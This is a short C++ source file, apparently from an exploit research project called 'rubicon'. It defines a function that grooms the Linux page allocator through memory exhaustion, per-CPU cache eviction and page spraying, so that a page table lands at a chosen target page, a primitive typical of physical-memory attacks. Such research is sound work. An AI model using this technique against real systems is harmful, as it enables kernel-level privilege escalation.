#include "rubicon.hpp"

#include <fcntl.h>
#include <sys/mman.h>

void* pt_install(const std::vector<void*>& bait_pages,
                 void* pt_target,
                 void* addr,
                 const std::vector<void*>& spray_pages, int fd_spray) {
    unsigned long exhaust_size = exhaust_pages_size_bytes();
    auto exhaust_ptr = mmap(NULL, exhaust_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    unmap_pages(bait_pages);
    pcp_evict();

    map_pages(spray_pages, fd_spray);

    munmap(exhaust_ptr, exhaust_size);

    const std::vector spray_tail(spray_pages.begin() + 1, spray_pages.end());
    unmap_pages(spray_tail); // unmaps p1 … pN-1

    // Move the target as next candidate for page table allocation
    // Install the page table at the target.
    munlock(pt_target, PAGE_SIZE);
    munmap(pt_target, PAGE_SIZE);

    return mmap(addr, PAGE_SIZE,
                PROT_READ | PROT_WRITE,
                MAP_FIXED | MAP_SHARED | MAP_POPULATE,
                fd_spray,
                0);
}